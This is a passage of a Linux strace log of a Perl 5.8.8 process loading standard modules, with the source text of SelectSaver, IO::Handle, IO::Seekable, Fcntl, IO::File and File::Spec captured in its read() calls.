};\n}\n\n#\n# of Safe.pm lineage\n#\nsub delete_package ($) {\n    my $pkg = shift;\n\n    # expand to full symbol table name if needed\n\n    unless ($pkg =~ /^main::.*::$/) {\n        $pkg = \"main$pkg\"\tif\t$pkg =~ /^::/;\n        $pkg = \"main::$pkg\"\tunless\t$pkg =~ /^main::/;\n        $pkg .= \'::\'\t\tunless\t$pkg =~ /::$/;\n    }\n\n    my($stem, $leaf) = $pkg =~ m/(.*::)(\\w+::)$/;\n    my $stem_symtab = *{$stem}{HASH};\n    return unless defined $stem_symtab and exists $stem_symtab->{$leaf};\n\n    # free all the symbols in the package\n\n    my $leaf_symtab = *{$stem_symtab->{$leaf}}{HASH};\n    foreach my $name (keys %$leaf_symtab) {\n        undef *{$pkg . $name};\n    }\n\n    # delete the symbol table\n\n    %$leaf_symtab = ();\n    delete $stem_symtab->{$leaf};\n}\n\n1;\n", 4096) = 2099
8423  07:23:22.831939 read(8, "", 4096) = 0
8423  07:23:22.831957 close(8)          = 0
8423  07:23:22.832026 stat64("/etc/perl/SelectSaver.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.832043 stat64("/etc/perl/SelectSaver.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.832057 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.832071 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.832086 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.832098 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.832113 stat64("/usr/lib/perl5/SelectSaver.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.832126 stat64("/usr/lib/perl5/SelectSaver.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.832176 stat64("/usr/share/perl5/SelectSaver.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.832190 stat64("/usr/share/perl5/SelectSaver.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.832232 stat64("/usr/lib/perl/5.8/SelectSaver.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.832244 stat64("/usr/lib/perl/5.8/SelectSaver.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.832259 stat64("/usr/share/perl/5.8/SelectSaver.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.832272 stat64("/usr/share/perl/5.8/SelectSaver.pm", {st_mode=S_IFREG|0644, st_size=340, ...}) = 0
8423  07:23:22.832294 open("/usr/share/perl/5.8/SelectSaver.pm", O_RDONLY|O_LARGEFILE) = 8
8423  07:23:22.832309 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc5a218) = -1 ENOTTY (Inappropriate ioctl for device)
8423  07:23:22.832320 _llseek(8, 0, [0], SEEK_CUR) = 0
8423  07:23:22.832340 read(8, "package SelectSaver;\n\nour $VERSION = \'1.01\';\n\nrequire 5.000;\nuse Carp;\nuse Symbol;\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new SelectSaver [FILEHANDLE]\';\n    my $fh = select;\n    my $self = bless \\$fh, $_[0];\n    select qualify($_[1], caller) if @_ > 1;\n    $self;\n}\n\nsub DESTROY {\n    my $self = $_[0];\n    select $$self;\n}\n\n1;\n", 4096) = 340
8423  07:23:22.832470 brk(0x81d6000)    = 0x81d6000
8423  07:23:22.832502 read(8, "", 4096) = 0
8423  07:23:22.832514 close(8)          = 0
8423  07:23:22.832939 read(6, "sage: $io->stat()\';\n    stat($_[0]);\n}\n\n################################################\n## State modification functions.\n##\n\nsub autoflush {\n    my $old = new SelectSaver qualify($_[0], caller);\n    my $prev = $|;\n    $| = @_ > 1 ? $_[1] : 1;\n    $prev;\n}\n\nsub output_field_separator {\n    carp \"output_field_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $,;\n    $, = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub output_record_separator {\n    carp \"output_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $\\;\n    $\\ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_record_separator {\n    carp \"input_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $/;\n    $/ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_line_number {\n    local $.;\n    () = tell qualify($_[0], caller) if ref($_[0]);\n    my $prev = $.;\n    $. = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_page_number {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $%;\n    $% = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_per_page {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $=;\n    $= = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_left {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $-;\n    $- = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $~;\n    $~ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_top_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $^;\n    $^ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_line_break_characters {\n    carp \"format_line_break_characters is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $:;\n    $: = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_formfeed {\n    carp \"format_formfeed is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $^L;\n    $^L = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub formline {\n    my $io = shift;\n    my $picture = shift;\n    local($^A) = $^A;\n    local($\\) = \"\";\n    formline($picture, @_);\n    print $io $^A;\n}\n\nsub format_write {\n    @_ < 3 || croak \'usage: $io->write( [FORMAT_NAME] )\';\n    if (@_ == 2) {\n\tmy ($io, $fmt) = @_;\n\tmy $oldfmt = $io->format_name($fmt);\n\tCORE::write($io);\n\t$io->format_name($oldfmt);\n    } else {\n\tCORE::write($_[0]);\n    }\n}\n\n# XXX undocumented\nsub fcntl {\n    @_ == 3 || croak \'usage: $io->fcntl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return fcntl($io, $op, $_[2]);\n}\n\n# XXX undocumented\nsub ioctl {\n    @_ == 3 || croak \'usage: $io->ioctl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return ioctl($io, $op, $_[2]);\n}\n\n# this sub is for compatability with older releases of IO that used\n# a sub called constant to detemine if a constant existed -- GMB\n#\n# The SEEK_* and _IO?BF constants were the only constants at that time\n# any new code should just chech defined(&CONSTANT_NAME)\n\nsub constant {\n    no strict \'refs\';\n    my $name = shift;\n    (($name =~ /^(SEEK_(SET|CUR|END)|_IO[FLN]BF)$/) && defined &{$name})\n\t? &{$name}() : undef;\n}\n\n# so that flush.pl can be deprecated\n\nsub printflush {\n    my $io = shift;\n    my $old;\n    $old = new SelectSaver qualify($io, caller) if ref($io);\n    local $| = 1;\n    if(ref($io)) {\n        print $io @_;\n    }\n    else {\n\tprint @_;\n    }\n}\n\n1;\n", 4096) = 3496
8423  07:23:22.833719 read(6, "", 4096) = 0
8423  07:23:22.840927 close(6)          = 0
8423  07:23:22.840927 stat64("/etc/perl/IO/Seekable.pmc", 0xbfc5a9ac) = -1 ENOENT (No such file or directory)
8423  07:23:22.840927 stat64("/etc/perl/IO/Seekable.pm", 0xbfc5a8bc) = -1 ENOENT (No such file or directory)
8423  07:23:22.840928 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pmc", 0xbfc5a9ac) = -1 ENOENT (No such file or directory)
8423  07:23:22.840928 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pm", 0xbfc5a8bc) = -1 ENOENT (No such file or directory)
8423  07:23:22.840928 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pmc", 0xbfc5a9ac) = -1 ENOENT (No such file or directory)
8423  07:23:22.840930 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pm", 0xbfc5a8bc) = -1 ENOENT (No such file or directory)
8423  07:23:22.840946 stat64("/usr/lib/perl5/IO/Seekable.pmc", 0xbfc5a9ac) = -1 ENOENT (No such file or directory)
8423  07:23:22.840958 stat64("/usr/lib/perl5/IO/Seekable.pm", 0xbfc5a8bc) = -1 ENOENT (No such file or directory)
8423  07:23:22.840972 stat64("/usr/share/perl5/IO/Seekable.pmc", 0xbfc5a9ac) = -1 ENOENT (No such file or directory)
8423  07:23:22.840986 stat64("/usr/share/perl5/IO/Seekable.pm", 0xbfc5a8bc) = -1 ENOENT (No such file or directory)
8423  07:23:22.840999 stat64("/usr/lib/perl/5.8/IO/Seekable.pmc", 0xbfc5a9ac) = -1 ENOENT (No such file or directory)
8423  07:23:22.841013 stat64("/usr/lib/perl/5.8/IO/Seekable.pm", {st_mode=S_IFREG|0644, st_size=686, ...}) = 0
8423  07:23:22.841035 open("/usr/lib/perl/5.8/IO/Seekable.pm", O_RDONLY|O_LARGEFILE) = 6
8423  07:23:22.841052 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc5a6c8) = -1 ENOTTY (Inappropriate ioctl for device)
8423  07:23:22.841064 _llseek(6, 0, [0], SEEK_CUR) = 0
8423  07:23:22.841084 read(6, "#\n\npackage IO::Seekable;\n\nuse 5.006_001;\nuse Carp;\nuse strict;\nour($VERSION, @EXPORT, @ISA);\nuse IO::Handle ();\n# XXX we can\'t get these from IO::Handle or we\'ll get prototype\n# mismatch warnings on C<use POSIX; use IO::File;> :-(\nuse Fcntl qw(SEEK_SET SEEK_CUR SEEK_END);\nrequire Exporter;\n\n@EXPORT = qw(SEEK_SET SEEK_CUR SEEK_END);\n@ISA = qw(Exporter);\n\n$VERSION = \"1.10\";\n$VERSION = eval $VERSION;\n\nsub seek {\n    @_ == 3 or croak \'usage: $io->seek(POS, WHENCE)\';\n    seek($_[0], $_[1], $_[2]);\n}\n\nsub sysseek {\n    @_ == 3 or croak \'usage: $io->sysseek(POS, WHENCE)\';\n    sysseek($_[0], $_[1], $_[2]);\n}\n\nsub tell {\n    @_ == 1 or croak \'usage: $io->tell()\';\n    tell($_[0]);\n}\n\n1;\n", 4096) = 686
8423  07:23:22.841288 stat64("/etc/perl/Fcntl.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.841305 stat64("/etc/perl/Fcntl.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.841318 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.841331 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.841345 stat64("/usr/local/share/perl/5.8.8/Fcntl.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.841357 stat64("/usr/local/share/perl/5.8.8/Fcntl.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.841371 stat64("/usr/lib/perl5/Fcntl.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.841383 stat64("/usr/lib/perl5/Fcntl.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.841396 stat64("/usr/share/perl5/Fcntl.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.841408 stat64("/usr/share/perl5/Fcntl.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.841421 stat64("/usr/lib/perl/5.8/Fcntl.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.841434 stat64("/usr/lib/perl/5.8/Fcntl.pm", {st_mode=S_IFREG|0644, st_size=3458, ...}) = 0
8423  07:23:22.841455 open("/usr/lib/perl/5.8/Fcntl.pm", O_RDONLY|O_LARGEFILE) = 8
8423  07:23:22.841469 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc5a218) = -1 ENOTTY (Inappropriate ioctl for device)
8423  07:23:22.841480 _llseek(8, 0, [0], SEEK_CUR) = 0
8423  07:23:22.841500 read(8, "package Fcntl;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS, $AUTOLOAD);\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n$VERSION = \"1.05\";\n# Items to export into callers namespace by default\n# (move infrequently used names to @EXPORT_OK below)\n@EXPORT =\n  qw(\n\tFD_CLOEXEC\n\tF_ALLOCSP\n\tF_ALLOCSP64\n\tF_COMPAT\n\tF_DUP2FD\n\tF_DUPFD\n\tF_EXLCK\n\tF_FREESP\n\tF_FREESP64\n\tF_FSYNC\n\tF_FSYNC64\n\tF_GETFD\n\tF_GETFL\n\tF_GETLK\n\tF_GETLK64\n\tF_GETOWN\n\tF_NODNY\n\tF_POSIX\n\tF_RDACC\n\tF_RDDNY\n\tF_RDLCK\n\tF_RWACC\n\tF_RWDNY\n\tF_SETFD\n\tF_SETFL\n\tF_SETLK\n\tF_SETLK64\n\tF_SETLKW\n\tF_SETLKW64\n\tF_SETOWN\n\tF_SHARE\n\tF_SHLCK\n\tF_UNLCK\n\tF_UNSHARE\n\tF_WRACC\n\tF_WRDNY\n\tF_WRLCK\n\tO_ACCMODE\n\tO_ALIAS\n\tO_APPEND\n\tO_ASYNC\n\tO_BINARY\n\tO_CREAT\n\tO_DEFER\n\tO_DIRECT\n\tO_DIRECTORY\n\tO_DSYNC\n\tO_EXCL\n\tO_EXLOCK\n\tO_LARGEFILE\n\tO_NDELAY\n\tO_NOCTTY\n\tO_NOFOLLOW\n\tO_NOINHERIT\n\tO_NONBLOCK\n\tO_RANDOM\n\tO_RAW\n\tO_RDONLY\n\tO_RDWR\n\tO_RSRC\n\tO_RSYNC\n\tO_SEQUENTIAL\n\tO_SHLOCK\n\tO_SYNC\n\tO_TEMPORARY\n\tO_TEXT\n\tO_TRUNC\n\tO_WRONLY\n     );\n\n# Other items we are prepared to export if requested\n@EXPORT_OK = qw(\n\tDN_ACCESS\n\tDN_ATTRIB\n\tDN_CREATE\n\tDN_DELETE\n\tDN_MODIFY\n\tDN_MULTISHOT\n\tDN_RENAME\n\tFAPPEND\n\tFASYNC\n\tFCREAT\n\tFDEFER\n\tFDSYNC\n\tFEXCL\n\tFLARGEFILE\n\tFNDELAY\n\tFNONBLOCK\n\tFRSYNC\n\tFSYNC\n\tFTRUNC\n\tF_GETLEASE\n\tF_GETSIG\n\tF_NOTIFY\n\tF_SETLEASE\n\tF_SETSIG\n\tLOCK_EX\n\tLOCK_MAND\n\tLOCK_NB\n\tLOCK_READ\n\tLOCK_RW\n\tLOCK_SH\n\tLOCK_UN\n\tLOCK_WRITE\n\tO_IGNORE_CTTY\n\tO_NOATIME\n\tO_NOLINK\n\tO_NOTRANS\n\tSEEK_CUR\n\tSEEK_END\n\tSEEK_SET\n\tS_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\tS_IREAD S_IWRITE S_IEXEC\n\tS_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\tS_IROTH S_IWOTH S_IXOTH S_IRWXO\n\tS_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\tS_ISUID S_ISGID S_ISVTX S_ISTXT\n\t_S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t&S_ISREG &S_ISDIR &S_ISLNK &S_ISSOCK &S_ISBLK &S_ISCHR &S_ISFIFO\n\t&S_ISWHT &S_ISENFMT &S_IFMT &S_IMODE\n);\n# Named groups of exports\n%EXPORT_TAGS = (\n    \'flock\'   => [qw(LOCK_SH LOCK_EX LOCK_NB LOCK_UN)],\n    \'Fcompat\' => [qw(FAPPEND FASYNC FCREAT FDEFER FDSYNC FEXCL FLARGEFILE\n\t\t     FNDELAY FNONBLOCK FRSYNC FSYNC FTRUNC)],\n    \'seek\'    => [qw(SEEK_SET SEEK_CUR SEEK_END)],\n    \'mode\'    => [qw(S_ISUID S_ISGID S_ISVTX S_ISTXT\n\t\t     _S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t\t     S_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\t\t     S_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\t\t     S_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\t\t     S_IROTH S_IWOTH S_IXOTH S_IRWXO\n\t\t     S_IREAD S_IWRITE S_IEXEC\n\t\t     S_ISREG S_ISDIR S_ISLNK S_ISSOCK\n\t\t     S_ISBLK S_ISCHR S_ISFIFO\n\t\t     S_ISWHT S_ISENFMT\t\t\n\t\t     S_IFMT S_IMODE\n                  )],\n);\n\nsub S_IFMT  { @_ ? ( $_[0] & _S_IFMT() ) : _S_IFMT()  }\nsub S_IMODE { $_[0] & 07777 }\n\nsub S_ISREG    { ( $_[0] & _S_IFMT() ) == S_IFREG()   }\nsub S_ISDIR    { ( $_[0] & _S_IFMT() ) == S_IFDIR()   }\nsub S_ISLNK    { ( $_[0] & _S_IFMT() ) == S_IFLNK()   }\nsub S_ISSOCK   { ( $_[0] & _S_IFMT() ) == S_IFSOCK()  }\nsub S_ISBLK    { ( $_[0] & _S_IFMT() ) == S_IFBLK()   }\nsub S_ISCHR    { ( $_[0] & _S_IFMT() ) == S_IFCHR()   }\nsub S_ISFIFO   { ( $_[0] & _S_IFMT() ) == S_IFIFO()   }\nsub S_ISWHT    { ( $_[0] & _S_IFMT() ) == S_IFWHT()   }\nsub S_ISENFMT  { ( $_[0] & _S_IFMT() ) == S_IFENFMT() }\n\nsub AUTOLOAD {\n    (my $constname = $AUTOLOAD) =~ s/.*:://;\n    die \"&Fcntl::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n        my (undef,$file,$line) = caller;\n        die \"$error at $file line $line.\\n\";\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Fcntl\', $VERSION;\n\n1;\n", 4096) = 3458
8423  07:23:22.841898 brk(0x81f7000)    = 0x81f7000
8423  07:23:22.842083 read(8, "", 4096) = 0
8423  07:23:22.842098 close(8)          = 0
8423  07:23:22.842222 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
8423  07:23:22.842249 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
8423  07:23:22.842278 open("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", O_RDONLY) = 8
8423  07:23:22.842293 read(8, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0 \10\0\0004\0\0\0\274,\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274*\0\0\274*\0\0\5\0\0\0\0\20\0\0\1\0\0\0\274*\0\0\274:\0\0\274:\0\0T\1\0\0X\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320*\0\0\320:\0\0\320:\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\21\0\0\0\36\0\0\0\0\0\0\0\25\0\0\0\32\0\0\0\24\0\0\0\5\0\0\0\t\0\0\0\0\0\0\0\23\0\0\0\21\0\0\0\34\0\0\0\4\0\0\0\26\0\0\0\0\0\0\0\30\0\0\0\17\0\0\0\27\0\0\0\r\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\1\0\0\0\0\0\0\0\3\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\v\0\0\0\6\0\0\0\35\0\0\0\7\0\0\0\0\0\0\0\22\0\0\0\31\0\0\0\33\0\0\0\20\0\0\0\16\0\0\0\n\0\0\0\0\0\0\0\f\0\0\0\10\0\0\0\0\0\0\0\3\0\0\0\27\0\0\0\2\0\0\0\6\0\0\0\210\0 \1\0\304H\t\27\0\0\0\32\0\0\0\35\0\0\0\356TU\220\272\343\222|CE\325\354.6bx\330qX\34\271\215\361\16\353\323\357\16\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\353\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0j\1\0\0\0\0\0\0\0\0\0\0\20\0\0\0\337\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0u\0\0\0\0\0\0\0", 512) = 512
8423  07:23:22.842385 fstat64(8, {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
8423  07:23:22.842404 mmap2(NULL, 15380, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 8, 0) = 0xb7dab000
8423  07:23:22.842419 mmap2(0xb7dae000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 8, 0x2) = 0xb7dae000
8423  07:23:22.842435 close(8)          = 0
8423  07:23:22.842706 read(6, "", 4096) = 0
8423  07:23:22.842722 close(6)          = 0
8423  07:23:22.842755 stat64("/etc/perl/IO/File.pmc", 0xbfc5a9ac) = -1 ENOENT (No such file or directory)
8423  07:23:22.842775 stat64("/etc/perl/IO/File.pm", 0xbfc5a8bc) = -1 ENOENT (No such file or directory)
8423  07:23:22.842789 stat64("/usr/local/lib/perl/5.8.8/IO/File.pmc", 0xbfc5a9ac) = -1 ENOENT (No such file or directory)
8423  07:23:22.842802 stat64("/usr/local/lib/perl/5.8.8/IO/File.pm", 0xbfc5a8bc) = -1 ENOENT (No such file or directory)
8423  07:23:22.842817 stat64("/usr/local/share/perl/5.8.8/IO/File.pmc", 0xbfc5a9ac) = -1 ENOENT (No such file or directory)
8423  07:23:22.842829 stat64("/usr/local/share/perl/5.8.8/IO/File.pm", 0xbfc5a8bc) = -1 ENOENT (No such file or directory)
8423  07:23:22.842844 stat64("/usr/lib/perl5/IO/File.pmc", 0xbfc5a9ac) = -1 ENOENT (No such file or directory)
8423  07:23:22.842855 stat64("/usr/lib/perl5/IO/File.pm", 0xbfc5a8bc) = -1 ENOENT (No such file or directory)
8423  07:23:22.842869 stat64("/usr/share/perl5/IO/File.pmc", 0xbfc5a9ac) = -1 ENOENT (No such file or directory)
8423  07:23:22.842881 stat64("/usr/share/perl5/IO/File.pm", 0xbfc5a8bc) = -1 ENOENT (No such file or directory)
8423  07:23:22.842894 stat64("/usr/lib/perl/5.8/IO/File.pmc", 0xbfc5a9ac) = -1 ENOENT (No such file or directory)
8423  07:23:22.842907 stat64("/usr/lib/perl/5.8/IO/File.pm", {st_mode=S_IFREG|0644, st_size=1784, ...}) = 0
8423  07:23:22.842928 open("/usr/lib/perl/5.8/IO/File.pm", O_RDONLY|O_LARGEFILE) = 6
8423  07:23:22.842943 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc5a6c8) = -1 ENOTTY (Inappropriate ioctl for device)
8423  07:23:22.842954 _llseek(6, 0, [0], SEEK_CUR) = 0
8423  07:23:22.842972 read(6, "#\n\npackage IO::File;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO::Seekable;\nuse File::Spec;\n\nrequire Exporter;\n\n@ISA = qw(IO::Handle IO::Seekable Exporter);\n\n$VERSION = \"1.13\";\n\n@EXPORT = @IO::Seekable::EXPORT;\n\neval {\n    # Make all Fcntl O_XXX constants available for importing\n    require Fcntl;\n    my @O = grep /^O_/, @Fcntl::EXPORT;\n    Fcntl->import(@O);  # first we import what we want to export\n    push(@EXPORT, @O);\n};\n\n################################################\n## Constructor\n##\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::File\";\n    @_ >= 0 && @_ <= 3\n\tor croak \"usage: new $class [FILENAME [,MODE [,PERMS]]]\";\n    my $fh = $class->SUPER::new();\n    if (@_) {\n\t$fh->open(@_)\n\t    or return undef;\n    }\n    $fh;\n}\n\n################################################\n## Open\n##\n\nsub open {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $fh->open(FILENAME [,MODE [,PERMS]])\';\n    my ($fh, $file) = @_;\n    if (@_ > 2) {\n\tmy ($mode, $perms) = @_[2, 3];\n\tif ($mode =~ /^\\d+$/) {\n\t    defined $perms or $perms = 0666;\n\t    return sysopen($fh, $file, $mode, $perms);\n\t} elsif ($mode =~ /:/) {\n\t    return open($fh, $mode, $file) if @_ == 3;\n\t    croak \'usage: $fh->open(FILENAME, IOLAYERS)\';\n\t}\n\tif (defined($file) && length($file)\n\t    && ! File::Spec->file_name_is_absolute($file))\n\t{\n\t    $file = File::Spec->rel2abs($file);\n\t}\n\t$file = IO::Handle::_open_mode_string($mode) . \" $file\\0\";\n    }\n    open($fh, $file);\n}\n\n################################################\n## Binmode\n##\n\nsub binmode {\n    ( @_ == 1 or @_ == 2 ) or croak \'usage $fh->binmode([LAYER])\';\n\n    my($fh, $layer) = @_;\n\n    return binmode $$fh unless $layer;\n    return binmode $$fh, $layer;\n}\n\n1;\n", 4096) = 1784
8423  07:23:22.843264 stat64("/etc/perl/File/Spec.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.843282 stat64("/etc/perl/File/Spec.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.843295 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.843308 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.843322 stat64("/usr/local/share/perl/5.8.8/File/Spec.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.843342 stat64("/usr/local/share/perl/5.8.8/File/Spec.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.843357 stat64("/usr/lib/perl5/File/Spec.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.843369 stat64("/usr/lib/perl5/File/Spec.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.843382 stat64("/usr/share/perl5/File/Spec.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.843395 stat64("/usr/share/perl5/File/Spec.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.843408 stat64("/usr/lib/perl/5.8/File/Spec.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.843421 stat64("/usr/lib/perl/5.8/File/Spec.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.843435 stat64("/usr/share/perl/5.8/File/Spec.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.843448 stat64("/usr/share/perl/5.8/File/Spec.pm", {st_mode=S_IFREG|0644, st_size=595, ...}) = 0
8423  07:23:22.843470 open("/usr/share/perl/5.8/File/Spec.pm", O_RDONLY|O_LARGEFILE) = 8
8423  07:23:22.843484 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc5a218) = -1 ENOTTY (Inappropriate ioctl for device)
8423  07:23:22.843496 _llseek(8, 0, [0], SEEK_CUR) = 0
8423  07:23:22.843514 read(8, "package File::Spec;\n\nuse strict;\nuse vars qw(@ISA $VERSION);\n\n$VERSION = \'3.12\';\n$VERSION = eval $VERSION;\n\nmy %module = (MacOS   => \'Mac\',\n\t      MSWin32 => \'Win32\',\n\t      os2     => \'OS2\',\n\t      VMS     => \'VMS\',\n\t      epoc    => \'Epoc\',\n\t      NetWare => \'Win32\', # Yes, File::Spec::Win32 works on NetWare.\n\t      symbian => \'Win32\', # Yes, File::Spec::Win32 works on symbian.\n\t      dos     => \'OS2\',   # Yes, File::Spec::OS2 works on DJGPP.\n\t      cygwin  => \'Cygwin\');\n\nmy $module = $module{$^O} || \'Unix\';\n\nrequire \"File/Spec/$module.pm\";\n@ISA = (\"File::Spec::$module\");\n\n1;\n\n__END__\n\n", 4096) = 595
8423  07:23:22.843590 stat64("/etc/perl/vars.pmc", 0xbfc5a04c) = -1 ENOENT (No such file or directory)
8423  07:23:22.843604 stat64("/etc/perl/vars.pm", 0xbfc59f5c) = -1 ENOENT (No such file or directory)
8423  07:23:22.843626 stat64("/usr/local/lib/perl/5.8.8/vars.pmc", 0xbfc5a04c) = -1 ENOENT (No such file or directory)
8423  07:23:22.843664 stat64("/usr/local/lib/perl/5.8.8/vars.pm", 0xbfc59f5c) = -1 ENOENT (No such file or directory)
8423  07:23:22.843692 stat64("/usr/local/share/perl/5.8.8/vars.pmc", 0xbfc5a04c) = -1 ENOENT (No such file or directory)
